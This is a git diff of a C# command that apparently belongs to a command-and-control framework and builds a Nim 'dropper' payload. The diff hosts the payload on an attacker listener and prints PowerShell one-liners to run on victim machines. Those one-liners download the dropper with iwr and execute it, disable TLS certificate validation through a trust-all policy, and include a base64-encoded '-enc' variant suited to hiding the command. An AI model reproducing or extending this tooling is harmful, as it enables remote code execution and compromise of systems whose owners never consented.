@@ -26,7 +26,7 @@ namespace Commander.Commands.Laucher
     }
     public class BuildDropperCommand : EnhancedCommand<BuildStagerCommandCommandOptions>
     {
-       
+
 
         public override string Category => CommandCategory.Commander;
         public override string Description => "Create a dropper file";
@@ -54,14 +54,26 @@ namespace Commander.Commands.Laucher
                 return false;
             }
 
-            var dotnetparms = (listener.Secured ? "https" : "http") + ":" + listener.Ip + ":" + listener.PublicPort;
+            string protocol = "http";
+            if (listener.Secured)
+                protocol = "https";
+
+            var dotnetparms = $"{protocol}:{listener.Ip}:{listener.PublicPort}";
 
             string outPath = Path.Combine("/tmp", context.Options.fileName);
-            var parms = BuildHelper.ComputeNimBuildParameters("dropper", outPath, false, false);
+            var parms = BuildHelper.ComputeNimBuildParameters("dropper", outPath, context.Options.debug, false);
 
-            parms.Add($"-d:ServerPort=80");
-            parms.Add($"-d:ServerAddress={listener.Ip}");
-            parms.Add($"-d:DotNetParams={dotnetparms}");
+
+
+            
+            parms.Insert(3, $"--cpu:amd64");
+            parms.Insert(3, $"-d:ssl");
+            parms.Insert(4, $"-d:ServerProtocol={protocol}");
+            parms.Insert(5, $"-d:ServerPort={listener.PublicPort}");
+            parms.Insert(6, $"-d:ServerAddress={listener.Ip}");
+            parms.Insert(7, $"-d:DotNetParams={dotnetparms}");
+            parms.Insert(8, $"-d:FileName=Agent.b64");
+            
 
 
             context.Terminal.WriteLine($"[>] Generating dropper...");
@@ -85,10 +97,24 @@ namespace Commander.Commands.Laucher
                 byte[] fileContent = File.ReadAllBytes(outPath);
                 context.CommModule.WebHost(listener.Id, context.Options.fileName, fileContent);
 
-                string url = $"http://{listener.Ip}/{context.Options.fileName}";
-                context.Terminal.WriteLine($"[X] dropper hosted on : {url}");
 
-                context.Terminal.WriteLine($"[>] Command : powershell -c \"iwr -Uri '{url}' -OutFile '{context.Options.fileName}'; .\\{context.Options.fileName}\"");
+
+                string url = $"{protocol}://{listener.Ip}:{listener.PublicPort}/{context.Options.fileName}";
+                context.Terminal.WriteLine($"[*] dropper hosted on : {url}");
+
+                string script = $"iwr -Uri '{url}' -OutFile '{context.Options.fileName}'; .\\{context.Options.fileName}";
+
+                if (listener.Secured)
+                {
+                    string sslscript = "add-type 'using System.Net;using System.Security.Cryptography.X509Certificates;public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}';[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy;";
+                    script = sslscript + script;
+                }
+
+                string enc64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
+
+                //string encoded = Encoding.UTF8.GetString(utf8String)
+                context.Terminal.WriteLine($"[>] Command : powershell -c \"{script}\"");
+                context.Terminal.WriteLine($"[>] Command : powershell -enc {enc64}");
             }
 
             return true;
